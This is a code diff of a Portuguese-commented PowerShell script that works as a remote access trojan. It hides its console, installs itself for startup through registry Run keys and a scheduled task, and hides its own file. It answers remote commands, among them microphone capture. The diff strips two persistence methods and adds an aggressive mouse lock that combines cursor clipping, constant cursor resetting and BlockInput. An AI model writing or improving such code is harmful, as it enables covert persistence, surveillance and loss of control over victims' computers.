@@ -113,19 +113,15 @@ Add-Type -Name Window -Namespace Console -MemberDefinition @'
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
-# ===== PERSISTÊNCIA MÚLTIPLA (GARANTE QUE EXECUTE NA INICIALIZAÇÃO) =====
+# ===== PERSISTÊNCIA MÚLTIPLA =====
 function Install-Persistence {
     try {
         Write-DebugLog "Instalando persistência..."
         
-        # Garante que a pasta existe
         New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
-        
-        # Copia o script para o local de instalação
         Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
         Write-DebugLog "Script copiado para: $scriptPath"
         
-        # ===== MÉTODO 1: Registro do Windows (RUN) =====
         try {
             $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
             Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
@@ -134,7 +130,6 @@ function Install-Persistence {
             Write-DebugLog "Erro ao adicionar ao registro: $_"
         }
         
-        # ===== MÉTODO 2: Tarefa Agendada (mais confiável) =====
         try {
             $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
             $trigger = New-ScheduledTaskTrigger -AtStartup
@@ -145,43 +140,16 @@ function Install-Persistence {
             Write-DebugLog "Erro ao criar tarefa agendada: $_"
         }
         
-        # ===== MÉTODO 3: Registro RunOnce (executa mesmo se o Run falhar) =====
-        try {
-            $regRunOncePath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
-            Set-ItemProperty -Path $regRunOncePath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
-            Write-DebugLog "Persistência adicionada ao RunOnce"
-        } catch {
-            Write-DebugLog "Erro ao adicionar ao RunOnce: $_"
-        }
-        
-        # ===== MÉTODO 4: Atalho na pasta de inicialização =====
-        try {
-            $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-            $shortcutPath = "$startupPath\$installName.lnk"
-            $WScriptShell = New-Object -ComObject WScript.Shell
-            $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
-            $shortcut.TargetPath = "powershell.exe"
-            $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
-            $shortcut.Save()
-            Write-DebugLog "Atalho adicionado à pasta de inicialização"
-        } catch {
-            Write-DebugLog "Erro ao criar atalho: $_"
-        }
-        
-        # Oculta o arquivo
         attrib +h +s +r $scriptPath
-        
         Write-DebugLog "Persistência instalada com sucesso"
     } catch {
         Write-DebugLog "Erro geral na instalação da persistência: $_"
     }
 }
 
-# ===== VERIFICA SE JÁ ESTÁ INSTALADO =====
 if (-not (Test-Path $scriptPath)) {
     Install-Persistence
 } else {
-    # Se já existe, verifica se o script atual é diferente (atualização)
     $currentScript = Get-Content $MyInvocation.MyCommand.Path -Raw
     $installedScript = Get-Content $scriptPath -Raw -ErrorAction SilentlyContinue
     if ($currentScript -ne $installedScript) {
@@ -539,17 +507,25 @@ function Unlock-Screen {
     }
 }
 
-# ===== TRAVAR MOUSE =====
+# ===== TRAVAR MOUSE (VERSÃO CORRIGIDA - MÚLTIPLAS CAMADAS) =====
 $script:mouseLocked = $false
 $script:lockThread = $null
+$script:clipCursorSuccess = $false
 
 function Lock-Mouse {
     try {
         if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
         
-        Write-DebugLog "Iniciando Lock-Mouse"
+        Write-DebugLog "=" * 60
+        Write-DebugLog "INICIANDO TRAVAMENTO DO MOUSE"
+        Write-DebugLog "=" * 60
         
-        $cSharpCode = @'
+        $script:mouseLocked = $true
+        
+        # ===== CAMADA 1: CLIPCURSOR (API NATIVA) =====
+        Write-DebugLog "CAMADA 1: Tentando ClipCursor via C#"
+        try {
+            $cSharpCode = @'
 using System;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
@@ -557,85 +533,190 @@ public class MouseLocker {
     [DllImport("user32.dll")]
     public static extern bool ClipCursor(ref RECT lpRect);
     
+    [DllImport("user32.dll")]
+    public static extern bool SetCursorPos(int x, int y);
+    
+    [DllImport("user32.dll")]
+    public static extern int ShowCursor(bool bShow);
+    
     [StructLayout(LayoutKind.Sequential)]
     public struct RECT {
         public int left, top, right, bottom;
     }
     
     public static void Lock() {
+        // Limita o cursor a uma área de 1 pixel
         RECT rect = new RECT();
         rect.left = 0;
         rect.top = 0;
         rect.right = 1;
         rect.bottom = 1;
         ClipCursor(ref rect);
+        
+        // Move o cursor para o canto
+        SetCursorPos(0, 0);
+        
+        // Esconde o cursor
+        ShowCursor(false);
     }
     
     public static void Unlock() {
+        // Libera o cursor para a tela toda
         RECT rect = new RECT();
         rect.left = 0;
         rect.top = 0;
         rect.right = Screen.PrimaryScreen.Bounds.Width;
         rect.bottom = Screen.PrimaryScreen.Bounds.Height;
         ClipCursor(ref rect);
+        
+        // Mostra o cursor
+        ShowCursor(true);
     }
 }
 '@
-        
-        try {
             Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
             [MouseLocker]::Lock()
-            Write-DebugLog "ClipCursor aplicado com sucesso"
+            $script:clipCursorSuccess = $true
+            Write-DebugLog "✓ ClipCursor aplicado com sucesso"
         } catch {
-            Write-DebugLog "Falha ao usar ClipCursor: $_"
+            Write-DebugLog "✗ Falha no ClipCursor: $_"
+            $script:clipCursorSuccess = $false
         }
         
-        $script:mouseLocked = $true
-        
+        # ===== CAMADA 2: THREAD DE MOVIMENTO CONSTANTE =====
+        Write-DebugLog "CAMADA 2: Iniciando thread de movimento constante"
         $script:lockThread = [System.Threading.Thread]::new({
             while ($script:mouseLocked) {
                 try {
                     [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
                     Start-Sleep -Milliseconds 1
-                } catch {}
+                } catch {
+                    # Ignora erros
+                }
             }
         })
         $script:lockThread.IsBackground = $true
         $script:lockThread.Start()
+        Write-DebugLog "✓ Thread de movimento iniciada"
         
-        Write-DebugLog "Thread de travamento iniciada"
-        return "MOUSE_LOCKED"
+        # ===== CAMADA 3: REFORÇO DO CLIPCURSOR (executa novamente a cada 100ms) =====
+        if ($script:clipCursorSuccess) {
+            Write-DebugLog "CAMADA 3: Iniciando thread de reforço do ClipCursor"
+            $script:reinforceThread = [System.Threading.Thread]::new({
+                while ($script:mouseLocked) {
+                    try {
+                        [MouseLocker]::Lock()
+                        Start-Sleep -Milliseconds 100
+                    } catch {
+                        # Ignora erros
+                    }
+                }
+            })
+            $script:reinforceThread.IsBackground = $true
+            $script:reinforceThread.Start()
+            Write-DebugLog "✓ Thread de reforço iniciada"
+        }
+        
+        # ===== CAMADA 4: BLOQUEIO DE EVENTOS DO MOUSE (via API) =====
+        Write-DebugLog "CAMADA 4: Tentando bloquear eventos do mouse"
+        try {
+            $blockInputCode = @'
+using System;
+using System.Runtime.InteropServices;
+public class InputBlocker {
+    [DllImport("user32.dll")]
+    public static extern bool BlockInput(bool fBlockIt);
+    
+    public static void Block() {
+        BlockInput(true);
+    }
+    
+    public static void Unblock() {
+        BlockInput(false);
+    }
+}
+'@
+            Add-Type -TypeDefinition $blockInputCode -ErrorAction SilentlyContinue
+            [InputBlocker]::Block()
+            Write-DebugLog "✓ Bloqueio de eventos aplicado"
+        } catch {
+            Write-DebugLog "✗ Falha no bloqueio de eventos: $_"
+        }
+        
+        Write-DebugLog "=" * 60
+        Write-DebugLog "TRAVAMENTO DO MOUSE CONCLUÍDO"
+        Write-DebugLog "=" * 60
+        
+        # Verificação
+        Start-Sleep -Milliseconds 100
+        if ($script:lockThread.IsAlive) {
+            Write-DebugLog "✓ Thread de movimento está ativa"
+            return "MOUSE_LOCKED"
+        } else {
+            Write-DebugLog "✗ Thread de movimento NÃO está ativa"
+            return "MOUSE_LOCK_ERROR"
+        }
     } catch {
-        Write-DebugLog "Erro geral em Lock-Mouse: $_"
+        Write-DebugLog "❌ ERRO CRÍTICO em Lock-Mouse: $_"
+        Write-DebugLog "Stack trace: $($_.ScriptStackTrace)"
         return "MOUSE_LOCK_ERROR"
     }
 }
 
 function Unlock-Mouse {
     try {
-        Write-DebugLog "Iniciando Unlock-Mouse"
+        Write-DebugLog "=" * 60
+        Write-DebugLog "INICIANDO LIBERAÇÃO DO MOUSE"
+        Write-DebugLog "=" * 60
         
         $script:mouseLocked = $false
         
-        try {
-            [MouseLocker]::Unlock()
-            Write-DebugLog "ClipCursor liberado"
-        } catch {
-            Write-DebugLog "Falha ao liberar ClipCursor: $_"
+        # ===== LIBERA CLIPCURSOR =====
+        if ($script:clipCursorSuccess) {
+            try {
+                [MouseLocker]::Unlock()
+                Write-DebugLog "✓ ClipCursor liberado"
+            } catch {
+                Write-DebugLog "✗ Erro ao liberar ClipCursor: $_"
+            }
         }
         
+        # ===== LIBERA BLOQUEIO DE EVENTOS =====
+        try {
+            [InputBlocker]::Unblock()
+            Write-DebugLog "✓ Bloqueio de eventos liberado"
+        } catch {
+            Write-DebugLog "✗ Erro ao liberar bloqueio de eventos: $_"
+        }
+        
+        # ===== PARA THREADS =====
         if ($script:lockThread -and $script:lockThread.IsAlive) {
             $script:lockThread.Abort()
-            Write-DebugLog "Thread de travamento abortada"
+            Write-DebugLog "✓ Thread de movimento abortada"
         }
         
+        if ($script:reinforceThread -and $script:reinforceThread.IsAlive) {
+            $script:reinforceThread.Abort()
+            Write-DebugLog "✓ Thread de reforço abortada"
+        }
+        
+        # ===== FORÇA LIBERAÇÃO DO CURSOR =====
         try {
+            Add-Type -AssemblyName System.Windows.Forms
             [System.Windows.Forms.Cursor]::Clip = New-Object System.Drawing.Rectangle(0, 0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
-        } catch {}
+            [System.Windows.Forms.Cursor]::Show()
+            Write-DebugLog "✓ Cursor liberado via Cursor.Clip"
+        } catch {
+            Write-DebugLog "✗ Erro ao forçar liberação: $_"
+        }
+        
+        Write-DebugLog "=" * 60
+        Write-DebugLog "LIBERAÇÃO DO MOUSE CONCLUÍDA"
+        Write-DebugLog "=" * 60
         
         return "MOUSE_UNLOCKED"
     } catch {
-        Write-DebugLog "Erro ao liberar mouse: $_"
+        Write-DebugLog "❌ ERRO CRÍTICO em Unlock-Mouse: $_"
         return "MOUSE_UNLOCK_ERROR"
     }
 }
@@ -775,6 +856,7 @@ while ($true) {
                 $writer.WriteLine($result)
             } elseif ($cmd -eq "unlock_mouse") {
                 $result = Unlock-Mouse
+                Write-DebugLog "Resultado unlock_mouse: $result"
                 $writer.WriteLine($result)
             } elseif ($cmd -eq "mic") {
                 $writer.WriteLine((Get-Microphone))
